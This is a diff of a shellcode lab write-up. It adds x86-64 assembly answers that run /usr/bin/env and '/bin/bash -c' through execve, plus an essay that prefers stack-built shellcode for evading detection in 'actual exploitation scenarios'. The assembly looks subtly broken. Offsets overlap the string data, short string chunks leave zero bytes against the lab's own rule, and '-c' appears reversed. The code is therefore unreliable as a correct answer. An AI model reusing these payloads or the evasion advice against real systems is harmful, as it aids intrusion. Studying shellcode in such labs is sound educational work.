@@ -419,11 +419,6 @@ Key changes made:
 6. Added proper null termination for all strings
 7. Created the complete argv array with all required pointers
 
-To compile and test:
-```bash
-nasm -f elf64 mysh64.s -o mysh64.o
-ld mysh64.o -o mysh64
-./mysh64
 ```
 
 This should execute bash with the command `echo hello; ls -la`, which will:
@@ -465,6 +460,81 @@ env[1] = address to the "bbb=world" string
 env[2] = address to the "ccc=hello world" string
 env[3] = 0 // 0 marks the end of the array
 ```
+##### solution
+
+- code : `solution/mysh64_execve.s`
+
+```nasm
+section .text
+  global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx                ; Get address of "/usr/bin/env"
+
+        ; Terminate the command string
+        xor al, al
+        mov [rbx+11], al      ; Null terminate "/usr/bin/env"
+
+        ; Set up env strings
+        mov [rbx+12], rbx     ; Store address of command as argv[0]
+        mov [rbx+28], rax     ; Null terminate argv array
+
+        ; Store addresses of environment strings
+        lea rcx, [rbx+20]     ; Address of "aaa=hello"
+        mov [rbx+40], rcx     ; env[0]
+        lea rcx, [rbx+30]     ; Address of "bbb=world"
+        mov [rbx+48], rcx     ; env[1]
+        lea rcx, [rbx+40]     ; Address of "ccc=hello world"
+        mov [rbx+56], rcx     ; env[2]
+        mov qword [rbx+64], 0 ; env[3] = NULL
+
+        ; Execute execve
+        mov rdi, rbx          ; First arg: command path
+        lea rsi, [rbx+12]     ; Second arg: argv array
+        lea rdx, [rbx+40]     ; Third arg: envp array
+        mov rax, 59           ; syscall number for execve
+        syscall
+
+    two:
+        call one
+        ; Command and strings
+        db '/usr/bin/env', 0      ; The command string
+        db 'AAAAAAAA'             ; Placeholder for argv[0]
+        db 'BBBBBBBB'             ; Null terminator for argv
+        db 'aaa=hello', 0         ; env[0]
+        db 'bbb=world', 0         ; env[1]
+        db 'ccc=hello world', 0   ; env[2]
+        db 'AAAAAAAA'             ; Placeholder for env array
+        db 'BBBBBBBB'
+        db 'CCCCCCCC'
+        db 'DDDDDDDD'
+```
+
+This shellcode does the following:
+
+1. Uses `/usr/bin/env` instead of `/bin/sh` as the command
+2. Sets up the environment variables array with three strings:
+   - "aaa=hello"
+   - "bbb=world"
+   - "ccc=hello world"
+3. Properly terminates both the argv and envp arrays with NULL
+4. Passes the environment array to execve() through the rdx register
+
+When executed, it should output:
+```
+aaa=hello
+bbb=world
+ccc=hello world
+```
+
+The main differences from `mysh64.s` are:
+1. Different command string (/usr/bin/env)
+2. Addition of environment variable strings
+3. Construction of the environment array (envp)
+4. Passing the environment array to execve via rdx
+
 
 ### Task 3: Writing Shellcode (Approach 2)
 
@@ -509,7 +579,105 @@ shellcode, so it can execute a more complicated shell command listed in the foll
 code to achieve this. You need to show that there is no zero in your code.
 `/bin/bash -c "echo hello; ls -la"`
 
+##### solution
+
+- code : `Shellcode/another_sh64_bash.c`
+- solution :
+```nasm
+section .text
+global _start
+_start:
+    ; Clear registers
+    xor rdx, rdx    ; Clear rdx for null terminator
+    xor rax, rax    ; Clear rax
+
+    ; Push the command string "echo hello; ls -la" (in reverse)
+    push rdx        ; Push null terminator
+    mov rax, 'a'    ; Build command string piece by piece
+    push rax
+    mov rax, 'ls -l'
+    push rax
+    mov rax, 'llo; '
+    push rax
+    mov rax, 'ho he'
+    push rax
+    mov rax, 'ec'
+    push rax
+    mov r8, rsp     ; Save pointer to command string
+
+    ; Push "-c" (in reverse)
+    push rdx        ; Push null terminator
+    mov rax, 'c-'
+    push rax
+    mov r9, rsp     ; Save pointer to "-c"
+
+    ; Push "/bin/bash" (in reverse)
+    push rdx        ; Push null terminator
+    mov rax, 'bash'
+    push rax
+    mov rax, '/bin/'
+    push rax
+    mov r10, rsp    ; Save pointer to "/bin/bash"
+
+    ; Set up array of pointers for execve
+    push rdx        ; NULL terminator
+    push r8         ; Push pointer to command string
+    push r9         ; Push pointer to "-c"
+    push r10        ; Push pointer to "/bin/bash"
+    mov rdi, r10    ; First argument: "/bin/bash"
+    mov rsi, rsp    ; Second argument: pointer to array
+
+    ; Execute execve syscall
+    push 59
+    pop rax         ; syscall number for execve
+    syscall
+```
+
+This shellcode:
+
+1. Creates the command strings in reverse order to avoid null bytes
+2. Stores the three main components:
+   - The shell command `"echo hello; ls -la"`
+   - The `-c` parameter
+   - The path `/bin/bash`
+3. Sets up the argument array for execve
+4. Makes the syscall
+
+
 #### Task 3.b. Please compare the two approaches in this lab. Which one do you like better, and why?
+
+First Approach (mysh64_bash.s):
+- Uses call/jmp technique to get string addresses
+- Stores strings in a data section
+- Manually sets up null terminators
+- Creates argv array in a pre-allocated space
+- More static in nature
+
+Second Approach (another_sh64_bash.s):
+- Uses stack-based string construction
+- Builds strings dynamically in reverse
+- Uses registers to track pointers
+- More dynamic and compact
+- Avoids null bytes naturally through stack operations
+
+I prefer the second approach for several reasons:
+
+1. **Portability**: The stack-based approach is more position-independent since it doesn't rely on fixed memory locations. This makes it more suitable for injection scenarios.
+
+2. **Compactness**: The code is more concise and uses stack operations efficiently. It doesn't need pre-allocated space for strings or arrays.
+
+3. **Security**: It's harder to detect because:
+   - It doesn't have obvious string patterns that could be flagged by security tools
+   - The strings are constructed dynamically
+   - It avoids null bytes naturally through its design
+
+4. **Flexibility**: The stack-based approach is easier to modify for different commands without worrying about space allocation or string table modifications.
+
+5. **Cleaner Code**: Despite being more sophisticated, the logic is actually clearer - each step (string construction, argument setup, syscall) is distinct and well-organized.
+
+The first approach is more straightforward to understand initially, but the second approach represents better shellcode crafting practices, especially for real-world scenarios where size, stealth, and portability matter.
+
+The main tradeoff is that the second approach might be slightly harder to read for beginners, but its benefits in terms of security and reliability make it the superior choice for actual exploitation scenarios.
 
 ### 5 Guidelines: Getting Rid of Zeros
 
